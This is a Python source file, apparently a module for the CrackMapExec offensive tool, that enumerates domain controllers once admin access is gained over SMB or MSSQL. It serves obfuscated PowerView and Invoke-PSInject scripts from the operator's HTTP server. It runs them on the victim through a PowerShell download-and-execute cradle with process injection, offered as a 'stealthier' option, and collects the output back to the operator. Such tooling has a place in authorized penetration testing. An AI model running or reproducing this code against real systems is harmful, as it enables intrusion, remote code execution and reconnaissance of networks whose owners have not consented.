from cme.helpers.powershell import *
from cme.helpers.logger import write_log, highlight
from datetime import datetime

class CMEModule:

    name = 'get_netdomaincontroller'
    description = "Enumerates all domain controllers"
    supported_protocols = ['smb', 'mssql']
    opsec_safe = True
    multiple_hosts = False

    def  options(self, context, module_options):
        '''
            INJECT    If set to true, this allows PowerView to work over 'stealthier' execution methods which have non-interactive contexts (e.g. WMI) (default: false)
        '''

        self.inject = False
        if 'INJECT' in module_options:
            self.inject = bool(module_options['INJECT'])

        self.ps_script1 = obfs_ps_script('Invoke-PSInject.ps1')
        self.ps_script2 = obfs_ps_script('powersploit/Recon/PowerView.ps1')

    def on_admin_login(self, context, connection):
        command = 'Get-NetDomainController | select Name,Domain,IPAddress | Out-String'
        powerview_cmd = gen_ps_iex_cradle(context, 'PowerView.ps1', command)

        #if self.inject:
        launcher = gen_ps_inject(powerview_cmd, context, inject_once=True)

        ps_command = create_ps_command(launcher)

        connection.execute(ps_command)

        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'Invoke-PSInject.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script1)

        elif 'PowerView.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script2)

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.getheader('content-length'))
        data = response.rfile.read(length)

        #We've received the response, stop tracking this host
        #response.stop_tracking_host()

        dc_count = 0
        if len(data):
            #context.log.highlight(data)
            context.log.info('Parsing output, please wait...')
            buf = StringIO(data).readlines()
            for line in buf:
                if line != '\r\n' and not line.startswith('Name') and not line.startswith('---'):
                    hostname, domain, ip = filter(None, line.strip().split(' '))
                    hostname = hostname.split('.')[0].upper()
                    domain   = domain.split('.')[0].upper()
                    #logging.debug('{} {} {}'.format(hostname, domain, ip))
                    context.db.add_computer(ip, hostname, domain, '', dc=True)
                    dc_count += 1

            context.log.success('Added {} Domain Controllers to the database'.format(highlight(dc_count)))
